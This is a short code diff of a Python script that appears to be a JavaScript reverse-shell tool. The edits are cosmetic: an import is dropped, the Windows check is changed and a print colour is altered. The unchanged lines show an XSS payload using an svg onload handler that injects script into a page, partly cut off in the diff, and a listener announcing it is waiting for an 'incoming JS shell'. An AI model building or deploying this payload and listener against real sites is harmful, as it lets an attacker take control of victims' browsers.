@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import socket
-import os
 import sys
 from requests import get
 import argparse
@@ -9,7 +8,7 @@ white = '\033[1;97m'
 red = '\033[1;31m'
 white = '\033[1;m'
 blue = '\033[0;34m'
-if os.name == 'nt':
+if sys.platform == 'win32':
     white = red = white = blue = ''
     
 if sys.version_info < (3, 0):
@@ -49,7 +48,7 @@ payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(cre
 
 print(banner)
 if gene == True:
-    print('%sPayload:' % white)
+    print('%sPayload:' % blue)
     print(payload)
     
 print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
